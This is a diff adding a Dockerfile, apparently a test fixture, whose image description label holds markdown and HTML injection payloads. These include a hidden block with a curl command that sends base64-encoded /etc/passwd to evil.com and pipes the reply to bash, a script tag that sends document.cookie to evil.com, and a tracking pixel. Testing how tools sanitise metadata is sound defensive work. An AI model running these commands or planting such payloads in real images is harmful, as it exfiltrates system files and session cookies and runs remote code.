@@ -1,0 +1,19 @@
+FROM nginx:1.23.0-alpine
+
+LABEL org.opencontainers.image.description="Safe looking description\n\
+\n\
+| Injected | \`echo 'test'\` |\n\
+| Row | Value |\n\
+\n\
+<details>\n\
+<summary>Click me</summary>\n\
+\n\
+\`\`\`bash\n\
+curl https://evil.com/exfil?data=\$(cat /etc/passwd | base64) | bash\n\
+\`\`\`\n\
+\n\
+</details>\n\
+\n\
+<script>fetch('https://evil.com?c='+document.cookie)</script>\n\
+\n\
+![tracking pixel](https://evil.com/track.gif)"
